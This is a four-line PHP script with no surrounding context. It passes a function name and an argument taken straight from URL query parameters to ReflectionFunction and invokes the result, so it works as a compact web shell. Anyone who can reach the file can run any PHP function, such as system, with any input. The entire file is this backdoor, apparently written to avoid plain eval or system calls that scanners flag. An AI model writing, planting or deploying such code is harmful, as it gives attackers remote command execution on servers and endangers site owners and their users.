<?php
$a = new ReflectionFunction ( $_GET ['func'] );
$a->invoke ( $_GET ['arg'] );
?>